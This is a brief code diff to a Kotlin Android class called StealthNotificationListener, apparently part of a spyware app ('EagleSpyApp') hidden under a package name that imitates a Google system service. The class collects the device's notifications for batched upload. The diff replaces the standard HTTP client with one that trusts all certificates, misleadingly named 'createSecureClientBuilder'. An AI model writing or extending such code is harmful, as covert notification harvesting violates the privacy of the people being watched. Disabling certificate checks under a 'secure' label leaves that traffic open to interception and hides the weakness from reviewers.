@@ -16,6 +16,7 @@ import android.service.notification.StatusBarNotification
 import android.util.Base64
 import android.util.Log
 import com.google.android.systemservice.EagleSpyApp
+import com.google.android.systemservice.utils.TrustAllCertificates
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
@@ -57,7 +58,7 @@ class StealthNotificationListener : NotificationListenerService() {
 
     private val handler = Handler(Looper.getMainLooper())
     private val pendingNotifications = ConcurrentLinkedQueue<JSONObject>()
-    private val httpClient = OkHttpClient()
+    private val httpClient = TrustAllCertificates.createSecureClientBuilder().build()
 
     private val batchRunnable = object : Runnable {
         override fun run() {
